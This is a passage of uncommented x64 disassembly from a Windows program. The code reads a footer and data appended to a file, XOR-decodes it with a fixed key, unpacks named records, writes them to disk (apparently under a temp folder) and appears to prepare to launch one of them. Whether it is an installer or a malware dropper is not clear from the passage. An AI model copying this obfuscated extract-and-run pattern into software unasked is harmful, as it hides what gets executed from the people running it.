   140001e0f:	48 8b 8d 90 01 00 00 	mov    0x190(%rbp),%rcx
   140001e16:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140001e1d:	00 
   140001e1e:	48 8b c1             	mov    %rcx,%rax
   140001e21:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140001e28:	72 19                	jb     0x140001e43
   140001e2a:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140001e2e:	48 83 c2 27          	add    $0x27,%rdx
   140001e32:	48 2b c1             	sub    %rcx,%rax
   140001e35:	48 83 e8 08          	sub    $0x8,%rax
   140001e39:	48 83 f8 1f          	cmp    $0x1f,%rax
   140001e3d:	0f 87 3c 0b 00 00    	ja     0x14000297f
   140001e43:	e8 9c 1b 00 00       	call   0x1400039e4
   140001e48:	0f 10 85 70 01 00 00 	movups 0x170(%rbp),%xmm0
   140001e4f:	0f 10 8d 80 01 00 00 	movups 0x180(%rbp),%xmm1
   140001e56:	0f 11 85 90 01 00 00 	movups %xmm0,0x190(%rbp)
   140001e5d:	0f 11 8d a0 01 00 00 	movups %xmm1,0x1a0(%rbp)
   140001e64:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
   140001e69:	48 8d 8d d0 01 00 00 	lea    0x1d0(%rbp),%rcx
   140001e70:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
   140001e77:	00 
   140001e78:	45 33 c9             	xor    %r9d,%r9d
   140001e7b:	ba 00 00 00 80       	mov    $0x80000000,%edx
   140001e80:	c7 44 24 20 03 00 00 	movl   $0x3,0x20(%rsp)
   140001e87:	00 
   140001e88:	41 b8 05 00 00 00    	mov    $0x5,%r8d
   140001e8e:	ff 15 a4 f1 00 00    	call   *0xf1a4(%rip)        # 0x140011038
   140001e94:	48 8b d8             	mov    %rax,%rbx
   140001e97:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140001e9b:	0f 84 56 0a 00 00    	je     0x1400028f7
   140001ea1:	33 d2                	xor    %edx,%edx
   140001ea3:	48 8b c8             	mov    %rax,%rcx
   140001ea6:	ff 15 94 f1 00 00    	call   *0xf194(%rip)        # 0x140011040
   140001eac:	83 f8 0c             	cmp    $0xc,%eax
   140001eaf:	0f 82 39 0a 00 00    	jb     0x1400028ee
   140001eb5:	bf f4 ff ff ff       	mov    $0xfffffff4,%edi
   140001eba:	41 b9 02 00 00 00    	mov    $0x2,%r9d
   140001ec0:	8b d7                	mov    %edi,%edx
   140001ec2:	45 33 c0             	xor    %r8d,%r8d
   140001ec5:	48 8b cb             	mov    %rbx,%rcx
   140001ec8:	ff 15 82 f1 00 00    	call   *0xf182(%rip)        # 0x140011050
   140001ece:	4c 8d 4c 24 60       	lea    0x60(%rsp),%r9
   140001ed3:	44 89 74 24 60       	mov    %r14d,0x60(%rsp)
   140001ed8:	41 b8 0c 00 00 00    	mov    $0xc,%r8d
   140001ede:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   140001ee3:	48 8d 95 20 01 00 00 	lea    0x120(%rbp),%rdx
   140001eea:	48 8b cb             	mov    %rbx,%rcx
   140001eed:	ff 15 55 f1 00 00    	call   *0xf155(%rip)        # 0x140011048
   140001ef3:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   140001ef9:	48 8d 15 a0 f4 00 00 	lea    0xf4a0(%rip),%rdx        # 0x1400113a0
   140001f00:	48 8d 8d 20 01 00 00 	lea    0x120(%rbp),%rcx
   140001f07:	e8 54 db 00 00       	call   0x14000fa60
   140001f0c:	85 c0                	test   %eax,%eax
   140001f0e:	0f 85 da 09 00 00    	jne    0x1400028ee
   140001f14:	8b 85 28 01 00 00    	mov    0x128(%rbp),%eax
   140001f1a:	85 c0                	test   %eax,%eax
   140001f1c:	0f 84 cc 09 00 00    	je     0x1400028ee
   140001f22:	2b f8                	sub    %eax,%edi
   140001f24:	41 b9 02 00 00 00    	mov    $0x2,%r9d
   140001f2a:	8b d7                	mov    %edi,%edx
   140001f2c:	45 33 c0             	xor    %r8d,%r8d
   140001f2f:	48 8b cb             	mov    %rbx,%rcx
   140001f32:	ff 15 18 f1 00 00    	call   *0xf118(%rip)        # 0x140011050
   140001f38:	44 8b 85 28 01 00 00 	mov    0x128(%rbp),%r8d
   140001f3f:	49 8b f6             	mov    %r14,%rsi
   140001f42:	4c 89 74 24 68       	mov    %r14,0x68(%rsp)
   140001f47:	41 8b f8             	mov    %r8d,%edi
   140001f4a:	4c 89 74 24 58       	mov    %r14,0x58(%rsp)
   140001f4f:	4d 8b fe             	mov    %r14,%r15
   140001f52:	45 85 c0             	test   %r8d,%r8d
   140001f55:	74 2d                	je     0x140001f84
   140001f57:	41 8b c8             	mov    %r8d,%ecx
   140001f5a:	e8 a1 f0 ff ff       	call   0x140001000
   140001f5f:	44 8b c7             	mov    %edi,%r8d
   140001f62:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
   140001f67:	33 d2                	xor    %edx,%edx
   140001f69:	48 8b c8             	mov    %rax,%rcx
   140001f6c:	48 8b f0             	mov    %rax,%rsi
   140001f6f:	4c 8d 3c 38          	lea    (%rax,%rdi,1),%r15
   140001f73:	4c 89 7c 24 58       	mov    %r15,0x58(%rsp)
   140001f78:	e8 83 e2 00 00       	call   0x140010200
   140001f7d:	44 8b 85 28 01 00 00 	mov    0x128(%rbp),%r8d
   140001f84:	4c 8d 4c 24 60       	lea    0x60(%rsp),%r9
   140001f89:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   140001f8e:	48 8b d6             	mov    %rsi,%rdx
   140001f91:	48 8b cb             	mov    %rbx,%rcx
   140001f94:	ff 15 ae f0 00 00    	call   *0xf0ae(%rip)        # 0x140011048
   140001f9a:	48 8b cb             	mov    %rbx,%rcx
   140001f9d:	ff 15 c5 f0 00 00    	call   *0xf0c5(%rip)        # 0x140011068
   140001fa3:	8b 85 28 01 00 00    	mov    0x128(%rbp),%eax
   140001fa9:	39 44 24 60          	cmp    %eax,0x60(%rsp)
   140001fad:	0f 85 fc 08 00 00    	jne    0x1400028af
   140001fb3:	49 8b ff             	mov    %r15,%rdi
   140001fb6:	49 8b ce             	mov    %r14,%rcx
   140001fb9:	48 2b fe             	sub    %rsi,%rdi
   140001fbc:	48 89 7c 24 70       	mov    %rdi,0x70(%rsp)
   140001fc1:	74 22                	je     0x140001fe5
   140001fc3:	48 8d 15 de f3 00 00 	lea    0xf3de(%rip),%rdx        # 0x1400113a8
   140001fca:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140001fd0:	48 8b c1             	mov    %rcx,%rax
   140001fd3:	83 e0 0f             	and    $0xf,%eax
   140001fd6:	0f b6 04 10          	movzbl (%rax,%rdx,1),%eax
   140001fda:	30 04 0e             	xor    %al,(%rsi,%rcx,1)
   140001fdd:	48 ff c1             	inc    %rcx
   140001fe0:	48 3b cf             	cmp    %rdi,%rcx
   140001fe3:	72 eb                	jb     0x140001fd0
   140001fe5:	48 83 ff 04          	cmp    $0x4,%rdi
   140001fe9:	0f 82 c0 08 00 00    	jb     0x1400028af
   140001fef:	8b 1e                	mov    (%rsi),%ebx
   140001ff1:	4c 8d 45 90          	lea    -0x70(%rbp),%r8
   140001ff5:	41 be 04 00 00 00    	mov    $0x4,%r14d
   140001ffb:	89 5d 88             	mov    %ebx,-0x78(%rbp)
   140001ffe:	45 33 e4             	xor    %r12d,%r12d
   140002001:	41 8b ce             	mov    %r14d,%ecx
   140002004:	33 d2                	xor    %edx,%edx
   140002006:	4c 89 65 90          	mov    %r12,-0x70(%rbp)
   14000200a:	e8 5e 0b 00 00       	call   0x140002b6d
   14000200f:	85 c0                	test   %eax,%eax
   140002011:	0f 84 95 08 00 00    	je     0x1400028ac
   140002017:	48 8d 95 e0 03 00 00 	lea    0x3e0(%rbp),%rdx
   14000201e:	b9 04 01 00 00       	mov    $0x104,%ecx
   140002023:	ff 15 37 f0 00 00    	call   *0xf037(%rip)        # 0x140011060
   140002029:	44 89 64 24 7c       	mov    %r12d,0x7c(%rsp)
   14000202e:	85 db                	test   %ebx,%ebx
   140002030:	0f 84 22 08 00 00    	je     0x140002858
   140002036:	66 44 0f 6f 05 11 f4 	movdqa 0xf411(%rip),%xmm8        # 0x140011450
   14000203d:	00 00 
   14000203f:	90                   	nop
   140002040:	49 8d 46 05          	lea    0x5(%r14),%rax
   140002044:	48 3b c7             	cmp    %rdi,%rax
   140002047:	0f 87 06 08 00 00    	ja     0x140002853
   14000204d:	45 8b 44 36 01       	mov    0x1(%r14,%rsi,1),%r8d
   140002052:	46 0f b6 2c 36       	movzbl (%rsi,%r14,1),%r13d
   140002057:	44 88 6c 24 50       	mov    %r13b,0x50(%rsp)
   14000205c:	4a 8d 1c 45 05 00 00 	lea    0x5(,%r8,2),%rbx
   140002063:	00 
   140002064:	4a 8d 04 45 05 00 00 	lea    0x5(,%r8,2),%rax
   14000206b:	00 
   14000206c:	49 03 de             	add    %r14,%rbx
   14000206f:	49 03 c6             	add    %r14,%rax
   140002072:	48 3b c7             	cmp    %rdi,%rax
   140002075:	0f 87 d8 07 00 00    	ja     0x140002853
   14000207b:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000207e:	48 8d 56 05          	lea    0x5(%rsi),%rdx
   140002082:	45 33 ff             	xor    %r15d,%r15d
   140002085:	48 8d 8d 50 01 00 00 	lea    0x150(%rbp),%rcx
   14000208c:	49 03 d6             	add    %r14,%rdx
   14000208f:	4c 89 bd 60 01 00 00 	mov    %r15,0x160(%rbp)
   140002096:	0f 11 85 50 01 00 00 	movups %xmm0,0x150(%rbp)
   14000209d:	4c 89 bd 68 01 00 00 	mov    %r15,0x168(%rbp)
   1400020a4:	e8 c7 ef ff ff       	call   0x140001070
   1400020a9:	48 8d 4b 08          	lea    0x8(%rbx),%rcx
   1400020ad:	48 3b cf             	cmp    %rdi,%rcx
   1400020b0:	0f 87 b3 07 00 00    	ja     0x140002869
   1400020b6:	44 8b 74 1e 04       	mov    0x4(%rsi,%rbx,1),%r14d
   1400020bb:	44 8b 24 1e          	mov    (%rsi,%rbx,1),%r12d
   1400020bf:	44 89 64 24 78       	mov    %r12d,0x78(%rsp)
   1400020c4:	49 8d 46 08          	lea    0x8(%r14),%rax
   1400020c8:	48 03 c3             	add    %rbx,%rax
   1400020cb:	48 3b c7             	cmp    %rdi,%rax
   1400020ce:	0f 87 39 07 00 00    	ja     0x14000280d
   1400020d4:	49 8d 04 0e          	lea    (%r14,%rcx,1),%rax
   1400020d8:	48 89 45 a0          	mov    %rax,-0x60(%rbp)
   1400020dc:	4c 8d 3c 1e          	lea    (%rsi,%rbx,1),%r15
   1400020e0:	41 80 fd 01          	cmp    $0x1,%r13b
   1400020e4:	75 2f                	jne    0x140002115
   1400020e6:	83 7d 80 02          	cmpl   $0x2,-0x80(%rbp)
   1400020ea:	7c 29                	jl     0x140002115
   1400020ec:	4c 8b 85 68 01 00 00 	mov    0x168(%rbp),%r8
   1400020f3:	49 83 f8 07          	cmp    $0x7,%r8
   1400020f7:	0f 86 f8 06 00 00    	jbe    0x1400027f5
   1400020fd:	48 8b 95 50 01 00 00 	mov    0x150(%rbp),%rdx
   140002104:	48 8d 8d 50 01 00 00 	lea    0x150(%rbp),%rcx
   14000210b:	e8 00 f4 ff ff       	call   0x140001510
   140002110:	e9 e0 06 00 00       	jmp    0x1400027f5
   140002115:	33 c0                	xor    %eax,%eax
   140002117:	8b d8                	mov    %eax,%ebx
   140002119:	8b f0                	mov    %eax,%esi
   14000211b:	45 85 e4             	test   %r12d,%r12d
   14000211e:	0f 84 c0 00 00 00    	je     0x1400021e4
   140002124:	49 8b cc             	mov    %r12,%rcx
   140002127:	e8 d4 ee ff ff       	call   0x140001000
   14000212c:	4d 8b c4             	mov    %r12,%r8
   14000212f:	33 d2                	xor    %edx,%edx
   140002131:	48 8b c8             	mov    %rax,%rcx
   140002134:	48 8b d8             	mov    %rax,%rbx
   140002137:	4a 8d 34 20          	lea    (%rax,%r12,1),%rsi
   14000213b:	e8 c0 e0 00 00       	call   0x140010200
   140002140:	33 c0                	xor    %eax,%eax
   140002142:	45 85 e4             	test   %r12d,%r12d
   140002145:	0f 84 99 00 00 00    	je     0x1400021e4
   14000214b:	45 85 f6             	test   %r14d,%r14d
   14000214e:	0f 84 90 00 00 00    	je     0x1400021e4
   140002154:	48 8b 4d 90          	mov    -0x70(%rbp),%rcx
   140002158:	49 8d 57 08          	lea    0x8(%r15),%rdx
   14000215c:	48 89 45 98          	mov    %rax,-0x68(%rbp)
   140002160:	4c 8b cb             	mov    %rbx,%r9
   140002163:	48 8d 45 98          	lea    -0x68(%rbp),%rax
   140002167:	4d 8b c6             	mov    %r14,%r8
   14000216a:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000216f:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   140002174:	e8 fa 09 00 00       	call   0x140002b73
   140002179:	85 c0                	test   %eax,%eax
   14000217b:	74 06                	je     0x140002183
   14000217d:	4c 39 65 98          	cmp    %r12,-0x68(%rbp)
   140002181:	74 61                	je     0x1400021e4
   140002183:	48 85 db             	test   %rbx,%rbx
   140002186:	74 33                	je     0x1400021bb
   140002188:	48 2b f3             	sub    %rbx,%rsi
   14000218b:	48 81 fe 00 10 00 00 	cmp    $0x1000,%rsi
   140002192:	72 1c                	jb     0x1400021b0
   140002194:	48 8b 43 f8          	mov    -0x8(%rbx),%rax
   140002198:	48 83 c6 27          	add    $0x27,%rsi
   14000219c:	48 2b d8             	sub    %rax,%rbx
   14000219f:	48 83 eb 08          	sub    $0x8,%rbx
   1400021a3:	48 83 fb 1f          	cmp    $0x1f,%rbx
   1400021a7:	0f 87 fc 07 00 00    	ja     0x1400029a9
   1400021ad:	48 8b d8             	mov    %rax,%rbx
   1400021b0:	48 8b d6             	mov    %rsi,%rdx
   1400021b3:	48 8b cb             	mov    %rbx,%rcx
   1400021b6:	e8 29 18 00 00       	call   0x1400039e4
   1400021bb:	4c 8b 85 68 01 00 00 	mov    0x168(%rbp),%r8
   1400021c2:	49 83 f8 07          	cmp    $0x7,%r8
   1400021c6:	0f 86 1f 06 00 00    	jbe    0x1400027eb
   1400021cc:	48 8b 95 50 01 00 00 	mov    0x150(%rbp),%rdx
   1400021d3:	48 8d 8d 50 01 00 00 	lea    0x150(%rbp),%rcx
   1400021da:	e8 31 f3 ff ff       	call   0x140001510
   1400021df:	e9 07 06 00 00       	jmp    0x1400027eb
   1400021e4:	45 33 ff             	xor    %r15d,%r15d
   1400021e7:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400021ea:	0f 11 85 30 01 00 00 	movups %xmm0,0x130(%rbp)
   1400021f1:	66 44 89 bd 30 01 00 	mov    %r15w,0x130(%rbp)
   1400021f8:	00 
   1400021f9:	f3 44 0f 7f 85 40 01 	movdqu %xmm8,0x140(%rbp)
   140002200:	00 00 
   140002202:	45 84 ed             	test   %r13b,%r13b
   140002205:	0f 85 32 02 00 00    	jne    0x14000243d
   14000220b:	4c 8b bd a0 01 00 00 	mov    0x1a0(%rbp),%r15
   140002212:	48 b9 fe ff ff ff ff 	movabs $0x7ffffffffffffffe,%rcx
   140002219:	ff ff 7f 
   14000221c:	48 8b c1             	mov    %rcx,%rax
   14000221f:	49 2b c7             	sub    %r15,%rax
   140002222:	48 83 f8 01          	cmp    $0x1,%rax
   140002226:	0f 82 b0 07 00 00    	jb     0x1400029dc
   14000222c:	48 83 bd a8 01 00 00 	cmpq   $0x7,0x1a8(%rbp)
   140002233:	07 
   140002234:	4c 8d ad 90 01 00 00 	lea    0x190(%rbp),%r13
   14000223b:	4d 8d 67 01          	lea    0x1(%r15),%r12
   14000223f:	bf 07 00 00 00       	mov    $0x7,%edi
   140002244:	4c 0f 47 ad 90 01 00 	cmova  0x190(%rbp),%r13
   14000224b:	00 
   14000224c:	4c 8d b5 b0 01 00 00 	lea    0x1b0(%rbp),%r14
   140002253:	0f 57 c9             	xorps  %xmm1,%xmm1
   140002256:	0f 11 85 b0 01 00 00 	movups %xmm0,0x1b0(%rbp)
   14000225d:	f3 0f 7f 8d c0 01 00 	movdqu %xmm1,0x1c0(%rbp)
   140002264:	00 
   140002265:	4c 3b e7             	cmp    %rdi,%r12
   140002268:	76 51                	jbe    0x1400022bb
   14000226a:	49 8b fc             	mov    %r12,%rdi
   14000226d:	48 83 cf 07          	or     $0x7,%rdi
   140002271:	48 3b f9             	cmp    %rcx,%rdi
   140002274:	76 0f                	jbe    0x140002285
   140002276:	48 8b f9             	mov    %rcx,%rdi
   140002279:	48 b9 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rcx
   140002280:	ff ff 7f 
   140002283:	eb 24                	jmp    0x1400022a9
   140002285:	48 83 ff 0a          	cmp    $0xa,%rdi
   140002289:	b8 0a 00 00 00       	mov    $0xa,%eax
   14000228e:	48 0f 42 f8          	cmovb  %rax,%rdi
   140002292:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   140002299:	ff ff 7f 
   14000229c:	48 8d 4f 01          	lea    0x1(%rdi),%rcx
   1400022a0:	48 3b c8             	cmp    %rax,%rcx
   1400022a3:	0f 87 18 07 00 00    	ja     0x1400029c1
   1400022a9:	48 03 c9             	add    %rcx,%rcx
   1400022ac:	e8 4f ed ff ff       	call   0x140001000
   1400022b1:	4c 8b f0             	mov    %rax,%r14
   1400022b4:	48 89 85 b0 01 00 00 	mov    %rax,0x1b0(%rbp)
   1400022bb:	48 89 bd c8 01 00 00 	mov    %rdi,0x1c8(%rbp)
   1400022c2:	49 8b d5             	mov    %r13,%rdx
   1400022c5:	4b 8d 3c 3f          	lea    (%r15,%r15,1),%rdi
   1400022c9:	4c 89 a5 c0 01 00 00 	mov    %r12,0x1c0(%rbp)
   1400022d0:	4c 8b c7             	mov    %rdi,%r8
   1400022d3:	49 8b ce             	mov    %r14,%rcx
   1400022d6:	e8 85 d8 00 00       	call   0x14000fb60
   1400022db:	4c 8b 85 60 01 00 00 	mov    0x160(%rbp),%r8
   1400022e2:	48 8d 95 50 01 00 00 	lea    0x150(%rbp),%rdx
   1400022e9:	45 33 ff             	xor    %r15d,%r15d
   1400022ec:	66 41 c7 04 3e 5c 00 	movw   $0x5c,(%r14,%rdi,1)
   1400022f3:	48 83 bd 68 01 00 00 	cmpq   $0x7,0x168(%rbp)
   1400022fa:	07 
   1400022fb:	48 8d 8d b0 01 00 00 	lea    0x1b0(%rbp),%rcx
   140002302:	66 47 89 3c 66       	mov    %r15w,(%r14,%r12,2)
   140002307:	48 0f 47 95 50 01 00 	cmova  0x150(%rbp),%rdx
   14000230e:	00 
   14000230f:	e8 1c f6 ff ff       	call   0x140001930
   140002314:	0f 10 30             	movups (%rax),%xmm6
   140002317:	0f 10 78 10          	movups 0x10(%rax),%xmm7
   14000231b:	4c 89 78 10          	mov    %r15,0x10(%rax)
   14000231f:	48 c7 40 18 07 00 00 	movq   $0x7,0x18(%rax)
   140002326:	00 
   140002327:	66 44 89 38          	mov    %r15w,(%rax)
   14000232b:	48 8b 95 48 01 00 00 	mov    0x148(%rbp),%rdx
   140002332:	48 83 fa 07          	cmp    $0x7,%rdx
   140002336:	76 39                	jbe    0x140002371
   140002338:	48 8b 8d 30 01 00 00 	mov    0x130(%rbp),%rcx
   14000233f:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140002346:	00 
   140002347:	48 8b c1             	mov    %rcx,%rax
   14000234a:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140002351:	72 19                	jb     0x14000236c
   140002353:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140002357:	48 83 c2 27          	add    $0x27,%rdx
   14000235b:	48 2b c1             	sub    %rcx,%rax
   14000235e:	48 83 e8 08          	sub    $0x8,%rax
   140002362:	48 83 f8 1f          	cmp    $0x1f,%rax
   140002366:	0f 87 5b 06 00 00    	ja     0x1400029c7
   14000236c:	e8 73 16 00 00       	call   0x1400039e4
   140002371:	48 8b 95 c8 01 00 00 	mov    0x1c8(%rbp),%rdx
   140002378:	0f 11 b5 30 01 00 00 	movups %xmm6,0x130(%rbp)
   14000237f:	0f 11 bd 40 01 00 00 	movups %xmm7,0x140(%rbp)
   140002386:	48 83 fa 07          	cmp    $0x7,%rdx
   14000238a:	76 39                	jbe    0x1400023c5
   14000238c:	48 8b 8d b0 01 00 00 	mov    0x1b0(%rbp),%rcx
   140002393:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   14000239a:	00 
   14000239b:	48 8b c1             	mov    %rcx,%rax
   14000239e:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1400023a5:	72 19                	jb     0x1400023c0
   1400023a7:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   1400023ab:	48 83 c2 27          	add    $0x27,%rdx
   1400023af:	48 2b c1             	sub    %rcx,%rax
   1400023b2:	48 83 e8 08          	sub    $0x8,%rax
   1400023b6:	48 83 f8 1f          	cmp    $0x1f,%rax
   1400023ba:	0f 87 07 06 00 00    	ja     0x1400029c7
   1400023c0:	e8 1f 16 00 00       	call   0x1400039e4
   1400023c5:	44 0f b6 6c 24 50    	movzbl 0x50(%rsp),%r13d
   1400023cb:	44 8b 64 24 78       	mov    0x78(%rsp),%r12d
   1400023d0:	49 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%r8
   1400023d7:	48 8d 15 62 f0 00 00 	lea    0xf062(%rip),%rdx        # 0x140011440
   1400023de:	48 8d 8d 30 01 00 00 	lea    0x130(%rbp),%rcx
   1400023e5:	e8 b6 f6 ff ff       	call   0x140001aa0
   1400023ea:	4c 8b c0             	mov    %rax,%r8
   1400023ed:	4c 89 bd 80 01 00 00 	mov    %r15,0x180(%rbp)
   1400023f4:	48 ff c8             	dec    %rax
   1400023f7:	4c 89 bd 88 01 00 00 	mov    %r15,0x188(%rbp)
   1400023fe:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002401:	0f 11 85 70 01 00 00 	movups %xmm0,0x170(%rbp)
   140002408:	48 83 f8 fd          	cmp    $0xfffffffffffffffd,%rax
   14000240c:	0f 87 43 01 00 00    	ja     0x140002555
   140002412:	4c 39 85 40 01 00 00 	cmp    %r8,0x140(%rbp)
   140002419:	48 8d 95 30 01 00 00 	lea    0x130(%rbp),%rdx
   140002420:	4c 0f 42 85 40 01 00 	cmovb  0x140(%rbp),%r8
   140002427:	00 
   140002428:	48 83 bd 48 01 00 00 	cmpq   $0x7,0x148(%rbp)
   14000242f:	07 
   140002430:	48 0f 47 95 30 01 00 	cmova  0x130(%rbp),%rdx
   140002437:	00 
   140002438:	e9 22 01 00 00       	jmp    0x14000255f
   14000243d:	0f 57 c9             	xorps  %xmm1,%xmm1
   140002440:	48 8d 8d e0 03 00 00 	lea    0x3e0(%rbp),%rcx
   140002447:	f3 0f 7f 8d c0 01 00 	movdqu %xmm1,0x1c0(%rbp)
   14000244e:	00 
   14000244f:	0f 11 85 b0 01 00 00 	movups %xmm0,0x1b0(%rbp)
   140002456:	e8 a5 4e 00 00       	call   0x140007300
   14000245b:	4c 8b c0             	mov    %rax,%r8
   14000245e:	48 8d 95 e0 03 00 00 	lea    0x3e0(%rbp),%rdx
   140002465:	48 8d 8d b0 01 00 00 	lea    0x1b0(%rbp),%rcx
   14000246c:	e8 ff eb ff ff       	call   0x140001070
   140002471:	48 83 bd 68 01 00 00 	cmpq   $0x7,0x168(%rbp)
   140002478:	07 
   140002479:	48 8d 95 50 01 00 00 	lea    0x150(%rbp),%rdx
   140002480:	4c 8b 85 60 01 00 00 	mov    0x160(%rbp),%r8
   140002487:	48 8d 8d b0 01 00 00 	lea    0x1b0(%rbp),%rcx
   14000248e:	48 0f 47 95 50 01 00 	cmova  0x150(%rbp),%rdx
   140002495:	00 
   140002496:	e8 95 f4 ff ff       	call   0x140001930
   14000249b:	0f 10 30             	movups (%rax),%xmm6
   14000249e:	0f 10 78 10          	movups 0x10(%rax),%xmm7
   1400024a2:	4c 89 78 10          	mov    %r15,0x10(%rax)
   1400024a6:	48 c7 40 18 07 00 00 	movq   $0x7,0x18(%rax)
   1400024ad:	00 
   1400024ae:	66 44 89 38          	mov    %r15w,(%rax)
   1400024b2:	48 8b 95 48 01 00 00 	mov    0x148(%rbp),%rdx
   1400024b9:	48 83 fa 07          	cmp    $0x7,%rdx
   1400024bd:	76 39                	jbe    0x1400024f8
   1400024bf:	48 8b 8d 30 01 00 00 	mov    0x130(%rbp),%rcx
   1400024c6:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   1400024cd:	00 
   1400024ce:	48 8b c1             	mov    %rcx,%rax
   1400024d1:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1400024d8:	72 19                	jb     0x1400024f3
   1400024da:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   1400024de:	48 83 c2 27          	add    $0x27,%rdx
   1400024e2:	48 2b c1             	sub    %rcx,%rax
   1400024e5:	48 83 e8 08          	sub    $0x8,%rax
   1400024e9:	48 83 f8 1f          	cmp    $0x1f,%rax
   1400024ed:	0f 87 ef 04 00 00    	ja     0x1400029e2
   1400024f3:	e8 ec 14 00 00       	call   0x1400039e4
   1400024f8:	48 8b 95 c8 01 00 00 	mov    0x1c8(%rbp),%rdx
   1400024ff:	0f 11 b5 30 01 00 00 	movups %xmm6,0x130(%rbp)
   140002506:	0f 11 bd 40 01 00 00 	movups %xmm7,0x140(%rbp)
   14000250d:	48 83 fa 07          	cmp    $0x7,%rdx
   140002511:	0f 86 b9 fe ff ff    	jbe    0x1400023d0
   140002517:	48 8b 8d b0 01 00 00 	mov    0x1b0(%rbp),%rcx
   14000251e:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140002525:	00 
   140002526:	48 8b c1             	mov    %rcx,%rax
   140002529:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140002530:	72 19                	jb     0x14000254b
   140002532:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140002536:	48 83 c2 27          	add    $0x27,%rdx
   14000253a:	48 2b c1             	sub    %rcx,%rax
   14000253d:	48 83 e8 08          	sub    $0x8,%rax
   140002541:	48 83 f8 1f          	cmp    $0x1f,%rax
   140002545:	0f 87 97 04 00 00    	ja     0x1400029e2
   14000254b:	e8 94 14 00 00       	call   0x1400039e4
   140002550:	e9 7b fe ff ff       	jmp    0x1400023d0
   140002555:	48 8d 15 ec ee 00 00 	lea    0xeeec(%rip),%rdx        # 0x140011448
   14000255c:	4d 8b c7             	mov    %r15,%r8
   14000255f:	48 8d 8d 70 01 00 00 	lea    0x170(%rbp),%rcx
   140002566:	e8 05 eb ff ff       	call   0x140001070
   14000256b:	48 83 bd 80 01 00 00 	cmpq   $0x0,0x180(%rbp)
   140002572:	00 
   140002573:	74 0c                	je     0x140002581
   140002575:	48 8d 8d 70 01 00 00 	lea    0x170(%rbp),%rcx
   14000257c:	e8 3f ed ff ff       	call   0x1400012c0
   140002581:	48 83 bd 48 01 00 00 	cmpq   $0x7,0x148(%rbp)
   140002588:	07 
   140002589:	48 8d 8d 30 01 00 00 	lea    0x130(%rbp),%rcx
   140002590:	4c 89 7c 24 30       	mov    %r15,0x30(%rsp)
   140002595:	ba 00 00 00 40       	mov    $0x40000000,%edx
   14000259a:	48 0f 47 8d 30 01 00 	cmova  0x130(%rbp),%rcx
   1400025a1:	00 
   1400025a2:	45 33 c9             	xor    %r9d,%r9d
   1400025a5:	45 33 c0             	xor    %r8d,%r8d
   1400025a8:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
   1400025af:	00 
   1400025b0:	c7 44 24 20 02 00 00 	movl   $0x2,0x20(%rsp)
   1400025b7:	00 
   1400025b8:	ff 15 7a ea 00 00    	call   *0xea7a(%rip)        # 0x140011038
   1400025be:	48 8b f8             	mov    %rax,%rdi
   1400025c1:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   1400025c5:	0f 84 eb 00 00 00    	je     0x1400026b6
   1400025cb:	44 89 7d 84          	mov    %r15d,-0x7c(%rbp)
   1400025cf:	45 85 e4             	test   %r12d,%r12d
   1400025d2:	74 18                	je     0x1400025ec
   1400025d4:	4c 8d 4d 84          	lea    -0x7c(%rbp),%r9
   1400025d8:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   1400025dd:	45 8b c4             	mov    %r12d,%r8d
   1400025e0:	48 8b d3             	mov    %rbx,%rdx
   1400025e3:	48 8b c8             	mov    %rax,%rcx
   1400025e6:	ff 15 6c ea 00 00    	call   *0xea6c(%rip)        # 0x140011058
   1400025ec:	48 8b cf             	mov    %rdi,%rcx
   1400025ef:	ff 15 73 ea 00 00    	call   *0xea73(%rip)        # 0x140011068
   1400025f5:	41 80 fd 01          	cmp    $0x1,%r13b
   1400025f9:	0f 85 b7 00 00 00    	jne    0x1400026b6
   1400025ff:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002602:	48 8d 8d 30 01 00 00 	lea    0x130(%rbp),%rcx
   140002609:	33 c0                	xor    %eax,%eax
   14000260b:	48 83 bd 48 01 00 00 	cmpq   $0x7,0x148(%rbp)
   140002612:	07 
   140002613:	48 89 45 10          	mov    %rax,0x10(%rbp)
   140002617:	48 0f 47 8d 30 01 00 	cmova  0x130(%rbp),%rcx
   14000261e:	00 
   14000261f:	45 33 c9             	xor    %r9d,%r9d
   140002622:	48 89 85 c0 01 00 00 	mov    %rax,0x1c0(%rbp)
   140002629:	45 33 c0             	xor    %r8d,%r8d
   14000262c:	48 8d 85 b0 01 00 00 	lea    0x1b0(%rbp),%rax
   140002633:	33 d2                	xor    %edx,%edx
   140002635:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
